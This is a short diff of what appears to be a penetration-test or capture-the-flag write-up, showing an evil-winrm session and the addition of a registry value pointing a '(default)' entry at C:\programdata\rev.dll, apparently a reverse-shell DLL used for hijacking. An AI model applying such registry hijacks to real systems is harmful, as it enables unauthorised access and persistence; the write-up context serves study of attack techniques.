@@ -546,7 +546,7 @@ evil-winrm-py PS C:\Temp>
 Then ill give all users full control over the file so `ee.reed` can use the file
 
 ```python
-
+-Name "(default)" -Value "C:\programdata\rev.dll"
 ```
 
 
